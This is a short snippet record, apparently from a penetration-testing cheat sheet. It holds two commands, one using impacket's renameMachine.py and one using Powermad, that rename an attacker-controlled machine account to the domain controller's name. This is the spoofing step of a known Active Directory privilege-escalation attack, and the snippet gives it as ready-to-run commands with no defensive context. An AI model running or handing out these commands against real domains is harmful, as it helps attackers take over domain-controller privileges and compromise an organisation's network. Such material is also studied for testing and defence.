---
id: b2db80c9-acc1-4148-97ae-a48b5e731c1b
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:03.096529+00:00'
updated_at: '2023-04-10T20:26:11.554516+00:00'
---

# Code Snippet b2db80c9

**Language**: ps1

```ps1
# https://github.com/SecureAuthCorp/impacket/pull/1224
impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
```


